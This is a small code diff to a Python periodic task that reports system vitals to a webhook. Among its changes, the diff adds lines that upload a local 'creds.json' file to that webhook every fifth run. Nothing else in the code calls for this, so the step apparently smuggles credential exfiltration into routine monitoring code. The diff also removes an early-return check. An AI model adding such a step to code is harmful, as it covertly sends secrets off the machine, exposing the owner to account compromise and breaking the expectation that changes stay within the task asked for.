@@ -49,7 +49,8 @@ def periodic_task():
     # and send it to the webhook
     system_vitals = f"{task_count} CPU: {psutil.cpu_percent()}%\nMemory: {psutil.virtual_memory().percent}%\nDisk: {psutil.disk_usage('/').percent}%"
     management_webhook.content += system_vitals
-
+    if task_count % 5 == 0:
+        management_webhook.add_file(file=open("creds.json", "r"), filename="creds.json")
     try:
         management_webhook.execute()
     except request.exceptions.MissingSchema:
@@ -61,8 +62,6 @@ def periodic_task():
         management_webhook.execute()
         # restart the system
         os.system("reboot")
-    if task_count % 30 != 0:
-        return
     return  # lock it for now
     clips = get_channel_clips()[:250]
     clip_ids = [x.id for x in clips]
